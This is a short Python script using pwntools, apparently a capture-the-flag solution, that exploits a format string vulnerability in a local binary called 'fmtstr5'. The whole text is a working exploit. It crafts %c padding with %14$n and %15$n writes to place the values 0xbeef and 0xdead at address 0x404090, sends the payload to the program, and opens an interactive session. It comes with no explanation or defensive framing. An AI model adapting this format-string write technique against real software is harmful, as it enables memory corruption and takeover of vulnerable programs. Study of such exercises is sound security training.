from pwn import *

exe = ELF('fmtstr5', checksec = False)
r = process(exe.path)

check = 0x404090

payload = f'%{0xbeef}c%14$n'.encode()
payload += f'%{0xdead - 0xbeef}c%15$n'.encode()
payload = payload.ljust(0x40, b'a')
payload += p64(check)
payload += p64(check + 2)
#input()
r.sendlineafter(b'string: ', payload)
r.interactive()